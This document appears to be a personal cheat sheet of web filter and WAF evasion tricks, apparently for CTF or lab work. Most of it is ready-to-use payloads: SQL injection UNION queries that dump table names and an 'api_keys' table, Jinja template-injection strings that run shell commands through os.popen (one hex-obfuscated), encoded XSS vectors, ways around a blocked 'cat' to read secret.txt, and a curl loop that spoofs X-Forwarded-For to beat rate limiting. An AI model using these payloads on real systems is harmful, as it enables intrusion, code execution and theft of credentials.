1. mixed case ex ``' oR tRue--``
2.  URL-encoding: `/` => `%2f`
3.  Hex-encoding: `_` => `\x5f, 0x5f`
4.  Unicode-encoding: `%` => `\u0025`
5. using whitespace and delimiters:
 `'/**/UNION/**/SELECT/**/1,2`
`<a/href=j&#x0D;avascript:a&#x0D;lert(1)>aaa</a>`
```'/**/uNion/**/sElect/**/1,2,name,4 FROM sqlite_master WHERE type='table';--``
``'/**/uNion/**/sElect/**/1,2,sql,4 FROM sqlite_master WHERE name='api_keys';--``
``- `select/**/*/from/**/users/**/where/**/id=1```
``select.*from.*where``
6. SSTI 
   ex. change
   ``- `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}``
   to
   ``{{ self["__init__"]["__globals__"]["__builtins__"]["__import__"]("os")["popen"]("id")["read"]() }}``
   or hex encode:
    `{{ self['\x5f\x5f\x69\x6e\x69\x74\x5f\x5f']['\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f']['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f']('\x6f\x73')['\x70\x6f\x70\x65\x6e']('\x69\x64')['\x72\x65\x61\x64']() }}`
   7. HTML Entity encoding
- `<img src=x onerror=&#97;lert(1)>`(decimal encoding for 'a')
- `<svg onload=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>`(hex encoding for 'alert')
- `<body onload=&#97;&#108;&#101;&#114;&#116;(1)>`(full decimal encoding)
- - `<img src=x onerror=\u0061lert(1)>` (unicode escape sequences)
  - - `<svg onload=&#x61;\u006cert(1)>` (mixed encoding)
  6. If cat command is block use:
- `tail secret.txt`
- `more secret.txt`
- `tac secret.txt`
- use shell wildcards:
  ``/bin/ca? secret.txt``
6. sometime WAF is checking ex. only first 50 characters of request body
7. HTTP Header Manipulation
- `X-Forwarded-For` header is commonly used to identify the client's IP address when requests pass through a proxy or load balancer. However, many applications trust this header without validation, allowing attackers to spoof their IP address and bypass rate limiting
  ex.
```
for i in {1..20};do curl http://10.82.155.113/api/posts -H "X-Forwarded-For: 192.168.1.$i";done
```
8. changing HTTP method:
 - Some applications process HEAD requests differently from GET
- OPTIONS can reveal API structure and allowed methods
- RESTAPI may accept PUT/PATCH/DELETE with different validation
- Less common methods may have reduced WAF coverage